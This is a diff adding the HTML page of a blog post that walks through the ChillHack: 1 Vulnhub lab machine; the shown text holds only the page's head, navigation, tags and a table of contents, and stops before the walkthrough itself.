@@ -1,0 +1,2639 @@
+
+
+
+<!doctype html>
+<html lang="en" class="no-js">
+    <head>
+        <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="generator" content="Hugo 0.128.2">
+    <meta name="theme" content="Hinode 0.14.0">
+    
+
+
+
+
+
+    
+    
+<link rel="stylesheet" href="/css/main.min.efe232a6d505bfd4eebc021116f402279b8f9434777650f9bc099c4caff52542.css" integrity="sha256-7+IyptUFv9TuvAIRFvQCJ5uPlDR3dlD5vAmcTK/1JUI=" crossorigin="anonymous">
+    
+        
+    
+    
+         
+        <link rel="preload" href="/fonts/inter-v12-latin-regular.woff2" as="font" type="font/woff2" crossorigin>
+
+
+
+
+
+    
+  <meta name="robots" content="index, follow">
+    <meta name="googlebot" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1">
+    <meta name="bingbot" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1">
+  <title>debugging the life - ChillHack: 1 - Vulnhub </title>
+    <meta name="description" content="ChillHack: 1 - A Vulnhub vulnerable machine walkthrough.">
+
+<link rel="canonical" href="https://tiagotavares.io/blog/chillhack/">
+
+<meta property="og:locale" content="en_US">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ChillHack: 1 - Vulnhub ">
+<meta property="og:description" content="ChillHack: 1 - A Vulnhub vulnerable machine walkthrough.">
+<meta property="og:url" content="https://tiagotavares.io/blog/chillhack/">
+<meta property="og:site_name" content="debugging the life">
+<meta property="article:published_time" content="2020-12-19T08:00:51-03:00">
+    <meta property="article:modified_time" content="2024-07-15T16:36:14-03:00">
+    <meta property="og:image" content="https://res.cloudinary.com/dtr6hzxnx/image/upload/c_fill,h_640,w_1280/v1608376755/blog/2020-12-19_08-06_jtie9z.jpg">
+<meta property="og:image:alt" content="ChillHack: 1 - Vulnhub ">
+
+
+
+<meta name="twitter:card" content="summary_large_image">
+
+
+<meta name="twitter:title" content="ChillHack: 1 - Vulnhub ">
+<meta name="twitter:description" content="ChillHack: 1 - A Vulnhub vulnerable machine walkthrough.">
+<meta name="twitter:image" content="https://res.cloudinary.com/dtr6hzxnx/image/upload/c_fill,h_640,w_1280/v1608376755/blog/2020-12-19_08-06_jtie9z.jpg">
+<meta name="twitter:image:alt" content="ChillHack: 1 - Vulnhub ">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@graph": [
+    {
+      "@type": "Organization",
+        "@id": "https://tiagotavares.io/#/schema/organization/1",
+      "name": "Tiago Tavares",
+      "url": "https://tiagotavares.io/",
+      "sameAs": [
+        , "https://github.com/0xtiago"
+        ],
+      "image": {
+          "@type": "ImageObject",
+          "@id": "https://tiagotavares.io/#/schema/image/1",
+          "url": "https://tiagotavares.io/\u003cnil\u003e",
+          "width": null ,
+          "height": null ,
+          "caption": "Tiago Tavares"
+        }
+      },
+    {
+      "@type": "WebSite",
+      "@id": "https://tiagotavares.io/#/schema/website/1",
+      "url": "https://tiagotavares.io/",
+      "name": "debugging the life",
+      "description": "Technical content, most about information security, offensive security and application security.",
+      "publisher": {
+          "@id": "https://tiagotavares.io/#/schema/organization/1"
+        }
+      },
+    {
+      "@type": "WebPage",
+      "@id": "https://tiagotavares.io/blog/chillhack/",
+      "url": "https://tiagotavares.io/blog/chillhack/",
+      "name": "ChillHack: 1 - Vulnhub ",
+      "description": "ChillHack: 1 - A Vulnhub vulnerable machine walkthrough.",
+      "isPartOf": {
+        "@id": "https://tiagotavares.io/#/schema/website/1"
+      },
+      "about": {
+          "@id": "https://tiagotavares.io/#/schema/organization/1"
+        },
+      "datePublished": "2020-12-19T08:00:51CET",
+      "dateModified": "2024-07-15T16:36:14CET",
+      "breadcrumb": {
+        "@id": "https://tiagotavares.io/blog/chillhack/#/schema/breadcrumb/1"
+      },
+      "primaryImageOfPage": {
+        "@id": "https://tiagotavares.io/blog/chillhack/#/schema/image/2"
+      },
+      "inLanguage": "en-US",
+      "potentialAction": [{
+        "@type": "ReadAction", "target": ["https://tiagotavares.io/blog/chillhack/"]
+      }]
+    },
+    {
+      "@type": "BreadcrumbList",
+      "@id": "https://tiagotavares.io/blog/chillhack/#/schema/breadcrumb/1",
+      "name": "Breadcrumbs",
+      "itemListElement": [{
+        "@type": "ListItem",
+        "position":  1 ,
+        "item": {
+          "@type": "WebPage",
+          "@id": "https://tiagotavares.io/",
+          "url": "https://tiagotavares.io/",
+          "name": "Home"
+          }
+        },{
+        "@type": "ListItem",
+        "position":  2 ,
+        "item": {
+          "@type": "WebPage",
+          "@id": "https://tiagotavares.io/blog/",
+          "url": "https://tiagotavares.io/blog/",
+          "name": "Blog"
+          }
+        },{
+        "@type": "ListItem",
+        "position":  3 ,
+        "item": {
+          "@id": "https://tiagotavares.io/blog/chillhack/"
+          }
+        }]
+    },
+
+    {
+      "@context": "https://schema.org",
+      "@graph": [
+        {
+          "@type": "Article",
+          "@id": "https://tiagotavares.io/#/schema/article/1",
+          "headline": "ChillHack: 1 - Vulnhub ",
+          "description": "ChillHack: 1 - A Vulnhub vulnerable machine walkthrough.",
+          "isPartOf": {
+            "@id": "https://tiagotavares.io/blog/chillhack/"
+          },
+          "mainEntityOfPage": {
+            "@id": "https://tiagotavares.io/blog/chillhack/"
+          },
+          "datePublished": "2020-12-19T08:00:51CET",
+          "dateModified": "2024-07-15T16:36:14CET",
+          "author": {
+            "@id": "https://tiagotavares.io/#/schema/person/2"
+          },
+          "publisher": {
+              "@id": "https://tiagotavares.io/#/schema/organization/1"
+            },
+          "image": {
+            "@id": "https://tiagotavares.io/blog/chillhack/#/schema/image/2"
+          }
+        }
+      ]
+    },
+    {
+      "@context": "https://schema.org",
+      "@graph": [
+        {
+          "@type": "Person",
+          "@id": "https://tiagotavares.io/#/schema/person/2",
+          "name":  null ,
+          "sameAs": [
+            ]
+        }
+      ]
+    },
+    {
+      "@context": "https://schema.org",
+      "@graph": [
+        {
+          "@type": "ImageObject",
+          "@id": "https://tiagotavares.io/blog/chillhack/#/schema/image/2",
+          "url": "https://res.cloudinary.com/dtr6hzxnx/image/upload/c_fill,h_640,w_1280/v1608376755/blog/2020-12-19_08-06_jtie9z.jpg",
+          "contentUrl": "https://res.cloudinary.com/dtr6hzxnx/image/upload/c_fill,h_640,w_1280/v1608376755/blog/2020-12-19_08-06_jtie9z.jpg",
+          "caption": "ChillHack: 1 - Vulnhub "
+        }
+      ]
+    }
+
+  ]
+}
+</script>
+    <link rel="icon" type="image/png" sizes="16x16" href="/img/favicon_hu29d17b5413868ec40c659bb26691088e_2409_16x16_resize_catmullrom_3.png">
+        <link rel="icon" type="image/png" sizes="32x32" href="/img/favicon_hu29d17b5413868ec40c659bb26691088e_2409_32x32_resize_catmullrom_3.png">
+        <link rel="icon" type="image/png" sizes="48x48" href="/img/favicon_hu29d17b5413868ec40c659bb26691088e_2409_48x48_resize_catmullrom_3.png">
+        <link rel="apple-touch-icon" sizes="180x180" href="/img/favicon_hu29d17b5413868ec40c659bb26691088e_2409_180x0_resize_catmullrom_3.png">
+    
+
+</head>
+
+    <body>
+
+        <script async src="https://www.googletagmanager.com/gtag/js?id=G-383626879"></script><script src="/js/critical.bundle.min.a73ed0b9da936bca55cd96a54840ab270bde232f86b9b2f7ca2026635b177982.js" integrity="sha256-pz7QudqTa8pVzZalSECrJwveIy&#43;GubL3yiAmY1sXeYI=" crossorigin="anonymous"></script>
+    <div class="d-flex flex-column min-vh-100">
+            <div class="d-flex flex-column ">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="container-fluid fixed-top p-0">
+
+
+
+
+
+
+<nav class="navbar p-4 bg-body navbar-fixed-top navbar-expand-md"
+        
+        
+        >
+        <div class="container-xxl p-0">
+            <div class="d-flex navbar-container justify-content-center">
+                
+                <div class="d-flex align-items-center">
+                        <button class="navbar-toggler collapsed p-0 mx-auto invisible fw-30" type="button">
+
+
+
+
+
+
+
+
+
+    
+
+    <!-- <i class="fas fa-ellipsis fa-fw"></i> --><svg class="svg-inline--fa fas fa-ellipsis fa-fw" fill="currentColor" aria-hidden="true" role="img" viewBox="0 0 448 512"><path d="M8 256a56 56 0 1 1 112 0A56 56 0 1 1 8 256zm160 0a56 56 0 1 1 112 0 56 56 0 1 1 -112 0zm216-56a56 56 0 1 1 0 112 56 56 0 1 1 0-112z"/></svg>
+
+    
+</button></div>
+        
+                
+                <div class="mx-auto">
+                    <a class="navbar-brand" href="/" aria-label="Home">
+                            <img src="/img/tt-logo-icon.svg" alt="debugging the life logo" height="30"></a>
+                </div>
+        
+                
+                <div class="d-flex align-items-center">
+                    <button class="navbar-toggler main-nav-toggler collapsed p-0" type="button" data-bs-toggle="collapse" data-bs-target="#navbar-0-collapse"
+                        aria-controls="navbar-0" aria-expanded="false" aria-label="Toggle main navigation">
+                        <span class="toggler-icon top-bar emphasis"></span>
+                        <span class="toggler-icon middle-bar emphasis"></span>
+                        <span class="toggler-icon bottom-bar emphasis"></span>
+                    </button>
+                </div>
+            </div>
+    
+            <div class="navbar-collapse collapse" id="navbar-0-collapse">
+                <div class="d-flex flex-fill ms-md-3">
+    <form class="search flex-fill position-relative me-auto">
+        <input class="search-input form-control is-search" type="search" placeholder="Search this site" aria-label="Search this site" autocomplete="off">
+        <div class="search-suggestions shadow bg-body rounded d-none" data-no-results="No results for"></div>
+    </form>
+</div>
+
+                <ul class="navbar-nav ms-auto">
+                            <li class="nav-item ">
+
+
+
+
+
+
+
+
+    
+        <a class="nav-link" 
+            
+            data-nav="main" data-nav-main="about" 
+            href="/about/" ><span >About</span>&nbsp;</a>
+    
+</li>
+                            <li class="nav-item ">
+
+
+
+
+
+
+
+
+    
+        <a class="nav-link active" 
+            
+            data-nav="main" data-nav-main="blog" 
+            href="/blog/" ><span  class="active">Blog</span>&nbsp;</a>
+    
+</li>
+                            <li class="nav-item ">
+
+
+
+
+
+
+
+
+    
+        <a class="nav-link" 
+            
+            data-nav="main" data-nav-main="tags" 
+            href="/tags/" ><span >Tags</span>&nbsp;</a>
+    
+</li><div class="d-flex mode-switch align-items-center" id="navbar-mode">
+        <input type="checkbox" class="checkbox navbar-mode-selector" id="navbar-mode-checkbox" />
+        <label class="label" for="navbar-mode-checkbox">
+
+
+
+
+
+
+
+
+
+    
+
+    <!-- <i class="fas fa-sun fa-fw"></i> --><svg class="svg-inline--fa fas fa-sun fa-fw" fill="currentColor" aria-hidden="true" role="img" viewBox="0 0 512 512"><path d="M361.5 1.2c5 2.1 8.6 6.6 9.6 11.9L391 121l107.9 19.8c5.3 1 9.8 4.6 11.9 9.6s1.5 10.7-1.6 15.2L446.9 256l62.3 90.3c3.1 4.5 3.7 10.2 1.6 15.2s-6.6 8.6-11.9 9.6L391 391 371.1 498.9c-1 5.3-4.6 9.8-9.6 11.9s-10.7 1.5-15.2-1.6L256 446.9l-90.3 62.3c-4.5 3.1-10.2 3.7-15.2 1.6s-8.6-6.6-9.6-11.9L121 391 13.1 371.1c-5.3-1-9.8-4.6-11.9-9.6s-1.5-10.7 1.6-15.2L65.1 256 2.8 165.7c-3.1-4.5-3.7-10.2-1.6-15.2s6.6-8.6 11.9-9.6L121 121 140.9 13.1c1-5.3 4.6-9.8 9.6-11.9s10.7-1.5 15.2 1.6L256 65.1 346.3 2.8c4.5-3.1 10.2-3.7 15.2-1.6zM160 256a96 96 0 1 1 192 0 96 96 0 1 1 -192 0zm224 0a128 128 0 1 0 -256 0 128 128 0 1 0 256 0z"/></svg>
+
+    
+
+
+
+
+
+
+
+
+
+
+    
+
+    <!-- <i class="fas fa-moon fa-fw"></i> --><svg class="svg-inline--fa fas fa-moon fa-fw" fill="currentColor" aria-hidden="true" role="img" viewBox="0 0 384 512"><path d="M223.5 32C100 32 0 132.3 0 256S100 480 223.5 480c60.6 0 115.5-24.2 155.8-63.4c5-4.9 6.3-12.5 3.1-18.7s-10.1-9.7-17-8.5c-9.8 1.7-19.8 2.6-30.1 2.6c-96.9 0-175.5-78.8-175.5-176c0-65.8 36-123.1 89.3-153.3c6.1-3.5 9.2-10.5 7.7-17.3s-7.3-11.9-14.3-12.5c-6.3-.5-12.6-.8-19-.8z"/></svg>
+
+    
+
+            <div class="ball"></div>
+        </label>
+    </div></ul>
+            </div>
+        </div>
+    </nav>
+</div>
+
+<div class="main-content">
+                    </div>
+                
+            </div>
+
+            
+                
+    
+
+    
+        <div class="offcanvas offcanvas-start" tabindex="-1" id="offcanvass-sidebar" aria-inledby="offcanvas-label">
+            <div class="offcanvas-header">
+                <h5 class="offcanvas-title" id="offcanvas-label">Blog</h5>
+                <button type="button" class="btn-close" data-bs-dismiss="offcanvas" aria-label="Close"></button>
+            </div>
+            <div class="offcanvas-body">
+                
+
+            </div>
+        </div>
+    
+
+    <div class="container-xxl flex-fill p-4 px-xxl-0">
+        <div class="row row-cols-1 row-cols-md-2 row-cols-lg-3">
+                <div class="col col-lg-2 d-none d-lg-block sidebar-overflow sticky-top pt-5">
+                    
+
+                </div>
+                <div class="col-12 col-md-9 col-lg-8 mb-5 p-4">
+                    
+
+
+
+
+
+
+
+
+
+
+
+    <nav aria-label="breadcrumb">
+        <ol class="breadcrumb">
+                    <li class="breadcrumb-item"><a href="/">Home</a></li>
+                
+                    <li class="breadcrumb-item"><a href="/blog/">Blogs</a></li>
+                <li class="breadcrumb-item active" aria-current="page">ChillHack: 1 - Vulnhub </li>
+        </ol>
+    </nav>
+<p class="display-4 mt-5">ChillHack: 1 - Vulnhub </p>
+
+    <small class="text-body-secondary text-uppercase">
+        Posted on December 19, 2020
+            &nbsp;(Last modified on July 15, 2024)
+        
+        &bull;
+        9&nbsp;min read &bull;
+        1,839&nbsp;words
+    </small>
+<div class="mt-3">
+        <div class="d-none-dark">
+            <div class="hstack gap-1">
+                
+
+
+
+
+
+
+
+
+
+    
+
+    <a aria-label="Vulnhub"
+        href="/tags/vulnhub/" class="btn btn-light btn-sm position-relative  "
+        role="button"
+        >
+        <div class="d-flex justify-content-center">
+            <div class="my-auto">Vulnhub</div>
+        </div></a>&nbsp;
+
+                
+
+
+
+
+
+
+
+
+
+    
+
+    <a aria-label="Hacking"
+        href="/tags/hacking/" class="btn btn-light btn-sm position-relative  "
+        role="button"
+        >
+        <div class="d-flex justify-content-center">
+            <div class="my-auto">Hacking</div>
+        </div></a>&nbsp;
+
+                
+
+
+
+
+
+
+
+
+
+    
+
+    <a aria-label="Ctf"
+        href="/tags/ctf/" class="btn btn-light btn-sm position-relative  "
+        role="button"
+        >
+        <div class="d-flex justify-content-center">
+            <div class="my-auto">Ctf</div>
+        </div></a>&nbsp;
+
+                
+
+
+
+
+
+
+
+
+
+    
+
+    <a aria-label="Writeup"
+        href="/tags/writeup/" class="btn btn-light btn-sm position-relative  "
+        role="button"
+        >
+        <div class="d-flex justify-content-center">
+            <div class="my-auto">Writeup</div>
+        </div></a>&nbsp;
+
+                
+
+
+
+
+
+
+
+
+
+    
+
+    <a aria-label="Walkthrough"
+        href="/tags/walkthrough/" class="btn btn-light btn-sm position-relative  "
+        role="button"
+        >
+        <div class="d-flex justify-content-center">
+            <div class="my-auto">Walkthrough</div>
+        </div></a>&nbsp;
+
+                </div>
+        </div>
+        
+        <div class="d-none-light">
+            <div class="hstack gap-1">
+                
+
+
+
+
+
+
+
+
+
+    
+
+    <a aria-label="Vulnhub"
+        href="/tags/vulnhub/" class="btn btn-outline-primary btn-sm position-relative  "
+        role="button"
+        >
+        <div class="d-flex justify-content-center">
+            <div class="my-auto">Vulnhub</div>
+        </div></a>&nbsp;
+
+                
+
+
+
+
+
+
+
+
+
+    
+
+    <a aria-label="Hacking"
+        href="/tags/hacking/" class="btn btn-outline-primary btn-sm position-relative  "
+        role="button"
+        >
+        <div class="d-flex justify-content-center">
+            <div class="my-auto">Hacking</div>
+        </div></a>&nbsp;
+
+                
+
+
+
+
+
+
+
+
+
+    
+
+    <a aria-label="Ctf"
+        href="/tags/ctf/" class="btn btn-outline-primary btn-sm position-relative  "
+        role="button"
+        >
+        <div class="d-flex justify-content-center">
+            <div class="my-auto">Ctf</div>
+        </div></a>&nbsp;
+
+                
+
+
+
+
+
+
+
+
+
+    
+
+    <a aria-label="Writeup"
+        href="/tags/writeup/" class="btn btn-outline-primary btn-sm position-relative  "
+        role="button"
+        >
+        <div class="d-flex justify-content-center">
+            <div class="my-auto">Writeup</div>
+        </div></a>&nbsp;
+
+                
+
+
+
+
+
+
+
+
+
+    
+
+    <a aria-label="Walkthrough"
+        href="/tags/walkthrough/" class="btn btn-outline-primary btn-sm position-relative  "
+        role="button"
+        >
+        <div class="d-flex justify-content-center">
+            <div class="my-auto">Walkthrough</div>
+        </div></a>&nbsp;
+
+                </div>
+        </div>
+    </div>
+
+
+
+
+
+
+
+
+
+<div class="py-3 text-body-secondary hstack gap-1">
+            Share via 
+
+
+
+
+
+
+
+
+
+    
+
+    <a aria-label="Share via LinkedIn"
+        href="https://www.linkedin.com/sharing/share-offsite/?url=https://tiagotavares.io/blog/chillhack/" class="btn btn-primary  position-relative  btn-social p-0"
+        role="button"
+        >
+        <div class="d-flex justify-content-center">
+            <div class="my-auto"></div><div class="align-self-center">
+
+
+
+
+
+
+
+
+
+    
+
+    <!-- <i class="fab fa-linkedin fa-fw"></i> --><svg class="svg-inline--fa fab fa-linkedin fa-fw" fill="currentColor" aria-hidden="true" role="img" viewBox="0 0 448 512"><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
+
+    
+</div>
+        </div></a>
+
+
+
+
+
+
+
+
+
+
+    
+
+    <a aria-label="Share via Twitter"
+        href="https://twitter.com/home?status=https://tiagotavares.io/blog/chillhack/" class="btn btn-primary  position-relative  btn-social p-0"
+        role="button"
+        >
+        <div class="d-flex justify-content-center">
+            <div class="my-auto"></div><div class="align-self-center">
+
+
+
+
+
+
+
+
+
+    
+
+    <!-- <i class="fab fa-x-twitter fa-fw"></i> --><svg class="svg-inline--fa fab fa-x-twitter fa-fw" fill="currentColor" aria-hidden="true" role="img" viewBox="0 0 512 512"><path d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8L200.7 275.5 26.8 48H172.4L272.9 180.9 389.2 48zM364.4 421.8h39.1L151.1 88h-42L364.4 421.8z"/></svg>
+
+    
+</div>
+        </div></a>
+
+
+
+
+
+
+
+
+
+
+    
+
+    <a aria-label="Share via Facebook"
+        href="https://www.facebook.com/sharer.php?u=https://tiagotavares.io/blog/chillhack/" class="btn btn-primary  position-relative  btn-social p-0"
+        role="button"
+        >
+        <div class="d-flex justify-content-center">
+            <div class="my-auto"></div><div class="align-self-center">
+
+
+
+
+
+
+
+
+
+    
+
+    <!-- <i class="fab fa-facebook fa-fw"></i> --><svg class="svg-inline--fa fab fa-facebook fa-fw" fill="currentColor" aria-hidden="true" role="img" viewBox="0 0 512 512"><path d="M512 256C512 114.6 397.4 0 256 0S0 114.6 0 256C0 376 82.7 476.8 194.2 504.5V334.2H141.4V256h52.8V222.3c0-87.1 39.4-127.5 125-127.5c16.2 0 44.2 3.2 55.7 6.4V172c-6-.6-16.5-1-29.6-1c-42 0-58.2 15.9-58.2 57.2V256h83.6l-14.4 78.2H287V510.1C413.8 494.8 512 386.9 512 256h0z"/></svg>
+
+    
+</div>
+        </div></a>
+
+
+
+
+
+
+
+
+
+
+
+    <a aria-label="Share via WhatsApp"
+        href="whatsapp://send?text=ChillHack%3A&#43;1&#43;-&#43;Vulnhub&#43;%20https://tiagotavares.io/blog/chillhack/" class="btn btn-primary  position-relative  btn-social p-0"
+        role="button"
+        >
+        <div class="d-flex justify-content-center">
+            <div class="my-auto"></div><div class="align-self-center">
+
+
+
+
+
+
+
+
+
+    
+
+    <!-- <i class="fab fa-whatsapp fa-fw"></i> --><svg class="svg-inline--fa fab fa-whatsapp fa-fw" fill="currentColor" aria-hidden="true" role="img" viewBox="0 0 448 512"><path d="M380.9 97.1C339 55.1 283.2 32 223.9 32c-122.4 0-222 99.6-222 222 0 39.1 10.2 77.3 29.6 111L0 480l117.7-30.9c32.4 17.7 68.9 27 106.1 27h.1c122.3 0 224.1-99.6 224.1-222 0-59.3-25.2-115-67.1-157zm-157 341.6c-33.2 0-65.7-8.9-94-25.7l-6.7-4-69.8 18.3L72 359.2l-4.4-7c-18.5-29.4-28.2-63.3-28.2-98.2 0-101.7 82.8-184.5 184.6-184.5 49.3 0 95.6 19.2 130.4 54.1 34.8 34.9 56.2 81.2 56.1 130.5 0 101.8-84.9 184.6-186.6 184.6zm101.2-138.2c-5.5-2.8-32.8-16.2-37.9-18-5.1-1.9-8.8-2.8-12.5 2.8-3.7 5.6-14.3 18-17.6 21.8-3.2 3.7-6.5 4.2-12 1.4-32.6-16.3-54-29.1-75.5-66-5.7-9.8 5.7-9.1 16.3-30.3 1.8-3.7.9-6.9-.5-9.7-1.4-2.8-12.5-30.1-17.1-41.2-4.5-10.8-9.1-9.3-12.5-9.5-3.2-.2-6.9-.2-10.6-.2-3.7 0-9.7 1.4-14.8 6.9-5.1 5.6-19.4 19-19.4 46.3 0 27.3 19.9 53.7 22.6 57.4 2.8 3.7 39.1 59.7 94.8 83.8 35.2 15.2 49 16.5 66.6 13.9 10.7-1.6 32.8-13.4 37.4-26.4 4.6-13 4.6-24.1 3.2-26.4-1.3-2.5-5-3.9-10.5-6.6z"/></svg>
+
+    
+</div>
+        </div></a>
+
+
+
+
+
+
+
+
+<div id="toast-message-email-4" class="toast" role="alert" aria-live="assertive" aria-atomic="true">
+    <div class="toast-header">
+        <strong class="me-auto">debugging the life</strong>
+        <button type="button" class="btn-close" data-bs-dismiss="toast" aria-label="Close"></button>
+    </div>
+    <div class="toast-body">Link copied to clipboard</div>
+</div>
+
+
+
+
+
+
+
+
+
+
+    
+
+    <a aria-label="Share via email"
+        href="#!" data-toast-target="toast-message-email-4" data-clipboard="https://tiagotavares.io/blog/chillhack/" class="btn btn-primary  position-relative  btn-social p-0"
+        role="button"
+        >
+        <div class="d-flex justify-content-center">
+            <div class="my-auto"></div><div class="align-self-center">
+
+
+
+
+
+
+
+
+
+    
+
+    <!-- <i class="fas fa-link fa-fw"></i> --><svg class="svg-inline--fa fas fa-link fa-fw" fill="currentColor" aria-hidden="true" role="img" viewBox="0 0 640 512"><path d="M579.8 267.7c56.5-56.5 56.5-148 0-204.5c-50-50-128.8-56.5-186.3-15.4l-1.6 1.1c-14.4 10.3-17.7 30.3-7.4 44.6s30.3 17.7 44.6 7.4l1.6-1.1c32.1-22.9 76-19.3 103.8 8.6c31.5 31.5 31.5 82.5 0 114L422.3 334.8c-31.5 31.5-82.5 31.5-114 0c-27.9-27.9-31.5-71.8-8.6-103.8l1.1-1.6c10.3-14.4 6.9-34.4-7.4-44.6s-34.4-6.9-44.6 7.4l-1.1 1.6C206.5 251.2 213 330 263 380c56.5 56.5 148 56.5 204.5 0L579.8 267.7zM60.2 244.3c-56.5 56.5-56.5 148 0 204.5c50 50 128.8 56.5 186.3 15.4l1.6-1.1c14.4-10.3 17.7-30.3 7.4-44.6s-30.3-17.7-44.6-7.4l-1.6 1.1c-32.1 22.9-76 19.3-103.8-8.6C74 372 74 321 105.5 289.5L217.7 177.2c31.5-31.5 82.5-31.5 114 0c27.9 27.9 31.5 71.8 8.6 103.9l-1.1 1.6c-10.3 14.4-6.9 34.4 7.4 44.6s34.4 6.9 44.6-7.4l1.1-1.6C433.5 260.8 427 182 377 132c-56.5-56.5-148-56.5-204.5 0L60.2 244.3z"/></svg>
+
+    
+</div>
+        </div></a>
+
+                
+                
+
+
+
+
+
+
+
+
+
+    
+
+    <a aria-label="Share via system"
+        href="#!" id="btn-webshare" class="btn btn-primary  position-relative  btn-social p-0"
+         data-sharing-description="%!s(<nil>)" data-sharing-title="%!s(<nil>)" data-sharing-url="%!s(<nil>)"role="button"
+        >
+        <div class="d-flex justify-content-center">
+            <div class="my-auto"></div><div class="align-self-center">
+
+
+
+
+
+
+
+
+
+    
+
+    <!-- <i class="fas fa-share-nodes fa-fw"></i> --><svg class="svg-inline--fa fas fa-share-nodes fa-fw" fill="currentColor" aria-hidden="true" role="img" viewBox="0 0 448 512"><path d="M352 224c53 0 96-43 96-96s-43-96-96-96s-96 43-96 96c0 4 .2 8 .7 11.9l-94.1 47C145.4 170.2 121.9 160 96 160c-53 0-96 43-96 96s43 96 96 96c25.9 0 49.4-10.2 66.6-26.9l94.1 47c-.5 3.9-.7 7.8-.7 11.9c0 53 43 96 96 96s96-43 96-96s-43-96-96-96c-25.9 0-49.4 10.2-66.6 26.9l-94.1-47c.5-3.9 .7-7.8 .7-11.9s-.2-8-.7-11.9l94.1-47C302.6 213.8 326.1 224 352 224z"/></svg>
+
+    
+</div>
+        </div></a>
+</div>
+<p class="lead mb-5 mt-3">ChillHack: 1 - A Vulnhub vulnerable machine walkthrough.</p>
+<div class="d-md-none pb-5">
+
+
+
+
+
+
+<div class="d-grid gap-2 mx-auto">
+        
+
+
+
+
+
+
+
+
+
+    
+
+    <a aria-label="On this page"
+        href="#toc-collapse" class="btn btn-outline-secondary  position-relative  toc-button"
+         data-bs-toggle="collapse" aria-expanded="false" aria-controls="toc-collapse"role="button"
+        >
+        <div class="d-flex justify-content-between">
+            <div class="my-auto">On this page</div><div class="align-self-center ps-1">
+
+
+
+
+
+
+
+
+
+    
+
+    <!-- <i class="fas fa-sort "></i> --><svg class="svg-inline--fa fas fa-sort " fill="currentColor" aria-hidden="true" role="img" viewBox="0 0 320 512"><path d="M137.4 41.4c12.5-12.5 32.8-12.5 45.3 0l128 128c9.2 9.2 11.9 22.9 6.9 34.9s-16.6 19.8-29.6 19.8H32c-12.9 0-24.6-7.8-29.6-19.8s-2.2-25.7 6.9-34.9l128-128zm0 429.3l-128-128c-9.2-9.2-11.9-22.9-6.9-34.9s16.6-19.8 29.6-19.8H288c12.9 0 24.6 7.8 29.6 19.8s2.2 25.7-6.9 34.9l-128 128c-12.5 12.5-32.8 12.5-45.3 0z"/></svg>
+
+    
+</div>
+        </div></a>
+</div>
+
+    <div class="collapse border bg-body-tertiary rounded p-1 navbar-nav-scroll" id="toc-collapse">
+        <div class="toc toc-panel text-body p-2">
+            <small><nav id="TableOfContents">
+  <ul>
+    <li><a href="#port-scan">Port scan</a></li>
+    <li><a href="#reading-public-available-ftp">Reading public available FTP</a></li>
+    <li><a href="#web-discovery">Web discovery</a>
+      <ul>
+        <li><a href="#nikto">Nikto</a></li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
+    <li><a href="#becoming-apaar">Becoming &ldquo;apaar&rdquo;</a></li>
+    <li><a href="#reverse-ssh-tunnel">Reverse SSH Tunnel</a></li>
+    <li><a href="#web-discovery-1">Web discovery</a>
+      <ul>
+        <li><a href="#nikto-1">Nikto</a></li>
+        <li><a href="#ffuf">ffuf</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></small>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="img-wrap mb-5"><img class="img-fluid rounded"
+            src="https://res.cloudinary.com/dtr6hzxnx/image/upload/c_fill,h_1200,w_2800/v1608376755/blog/2020-12-19_08-06_jtie9z.jpg"
+            
+            fetchpriority="high"
+            srcset="https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fill,h_247,w_576/v1608376755/blog/2020-12-19_08-06_jtie9z.png 576w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fill,h_329,w_768/v1608376755/blog/2020-12-19_08-06_jtie9z.png 768w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fill,h_425,w_992/v1608376755/blog/2020-12-19_08-06_jtie9z.png 992w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fill,h_514,w_1200/v1608376755/blog/2020-12-19_08-06_jtie9z.png 1200w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fill,h_600,w_1400/v1608376755/blog/2020-12-19_08-06_jtie9z.png 1400w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fill,h_1200,w_2800/v1608376755/blog/2020-12-19_08-06_jtie9z.png 2800w" sizes="100vw"
+            height="1200"
+            width="2800"
+            alt="ChillHack: 1 - Vulnhub ">
+</div><!-- raw HTML omitted -->
+
+<h1 id="table-of-contents" class="heading">Table of contents <a href="#table-of-contents" aria-labelledby="table-of-contents">
+
+
+
+
+
+
+
+
+
+    
+
